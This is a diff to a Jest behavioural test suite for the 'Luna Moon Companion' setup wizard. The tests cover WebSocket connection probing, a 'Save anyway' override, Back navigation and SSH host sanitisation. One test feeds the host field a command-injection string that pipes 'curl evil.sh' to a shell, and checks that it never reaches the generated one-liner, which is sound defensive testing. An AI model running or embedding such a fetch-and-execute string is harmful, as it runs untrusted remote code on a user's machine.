@@ -2515,23 +2515,33 @@ describe('Luna Moon Companion - Behavioral Driven Tests', () => {
       expect(status.classList.contains('fail')).toBe(true)
     })
 
-    it('Scenario: Save & finish persists via save_connection, reconnects, and celebrates', async () => {
-      class FakeWS {
+    function fakeWsClass(sockets: any[]) {
+      return class FakeWS {
+        url: string
         onmessage: any; onclose: any; onerror: any; onopen: any
         readyState = 0
-        constructor(_url: string) {}
+        constructor(url: string) { this.url = url; sockets.push(this) }
         close() {}
         send() {}
         addEventListener() {}      // WebSocketEngine.connect wires via listeners
         removeEventListener() {}
       }
-      ;(window as any).WebSocket = FakeWS
+    }
+
+    it('Scenario: Save & finish verifies the hello FIRST, then persists, reconnects, and celebrates', async () => {
+      const sockets: any[] = []
+      ;(window as any).WebSocket = fakeWsClass(sockets)
       const invoke = stubCore(() => undefined)
 
       W().open()
       ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://moonbase:4753/ui'
       ;(document.getElementById('wizard-connect-token') as HTMLInputElement).value = 'sekrit'
-      await W().finish()
+
+      const pending = W().finish()
+      // Nothing persisted yet — the probe is still listening.
+      expect(invoke.mock.calls.find((c: any[]) => c[0] === 'save_connection')).toBeFalsy()
+      sockets[0].onmessage({ data: JSON.stringify({ type: 'hello', protocolVersion: 2 }) })
+      await pending
 
       const saved = invoke.mock.calls.find((c: any[]) => c[0] === 'save_connection')
       expect(saved).toBeTruthy()
@@ -2543,6 +2553,47 @@ describe('Luna Moon Companion - Behavioral Driven Tests', () => {
       expect(activeStep()).toBe('done')
       // Cross-server thread state was reset, same as a Settings server switch.
       expect(M().State.skipLastThreadFile).toBe(true)
+    })
+
+    it('Scenario: failed probe blocks the save; the button re-arms as an explicit "Save anyway"', async () => {
+      const sockets: any[] = []
+      ;(window as any).WebSocket = fakeWsClass(sockets)
+      const invoke = stubCore(() => undefined)
+
+      W().open()
+      W().goTo('connect')
+      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://nowhere:4753/ui'
+
+      const firstClick = W().finish()
+      sockets[0].onclose({ code: 1006 })
+      await firstClick
+
+      // Refused ⇒ nothing saved, button now offers the explicit override.
+      expect(invoke.mock.calls.find((c: any[]) => c[0] === 'save_connection')).toBeFalsy()
+      const finishBtn = document.getElementById('wizard-finish-btn')!
+      expect(finishBtn.textContent).toBe('Save anyway')
+      expect(activeStep()).toBe('connect')
+
+      await W().finish()   // second click: forceSave skips the probe
+      expect(invoke.mock.calls.find((c: any[]) => c[0] === 'save_connection')).toBeTruthy()
+      expect(activeStep()).toBe('done')
+      // Guard resets for the next visitor of the step.
+      expect(finishBtn.textContent).toBe('Save & finish')
+    })
+
+    it('Scenario: a first frame that is NOT hello reads as "not Luna", never success', async () => {
+      const sockets: any[] = []
+      ;(window as any).WebSocket = fakeWsClass(sockets)
+
+      W().open()
+      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://some-other-service/ws'
+      const testPromise = W().runConnectTest()
+      sockets[0].onmessage({ data: JSON.stringify({ type: 'thread-list', threads: [] }) })
+      const ok = await testPromise
+      expect(ok).toBe(false)
+      const status = document.getElementById('wizard-connect-status')!
+      expect(status.classList.contains('fail')).toBe(true)
+      expect(status.textContent).toContain('doesn’t sound like Luna')
     })
 
     it('Scenario: fresh Mac -> install runs the real steps in order and starts the server', async () => {
@@ -2648,6 +2699,11 @@ describe('Luna Moon Companion - Behavioral Driven Tests', () => {
       expect(activeStep()).toBe('connect')
       expect((document.getElementById('wizard-connect-url') as HTMLInputElement).value)
         .toBe('ws://127.0.0.1:4753/ui')
+
+      // Back from here must return to the local FORM, not an empty progress
+      // screen — no install run ever happened on this path.
+      document.getElementById('wizard-connect-back')!.click()
+      expect(activeStep()).toBe('local')
     })
 
     it('Scenario: local install failure paints the bead red, shows the log, and offers Back', async () => {
@@ -2705,6 +2761,21 @@ describe('Luna Moon Companion - Behavioral Driven Tests', () => {
       expect(activeStep()).toBe('connect')
       expect((document.getElementById('wizard-connect-url') as HTMLInputElement).value)
         .toBe('ws://moonbase:4753/ui')                       // user@ stripped, ws guessed
+    })
+
+    it('Scenario: an ssh destination with quotes/spaces never reaches the generated one-liner', () => {
+      stubCore(() => undefined)
+      W().open()
+      W().choosePath('remote')
+
+      const host = document.getElementById('wizard-remote-host') as HTMLInputElement
+      host.value = `bad host'; curl evil.sh | sh; '`
+      host.dispatchEvent(new Event('input', { bubbles: true }))
+
+      const cmd = document.getElementById('wizard-remote-cmd')!.textContent!
+      expect(cmd).toContain('ssh -t user@your-server')       // placeholder fallback
+      expect(cmd).not.toContain('evil.sh')
+      expect(W()._remoteWsGuess).toBe('')                    // no bogus prefill either
     })
 
     it('Scenario: Settings → Connection has a re-entry point for the wizard', () => {
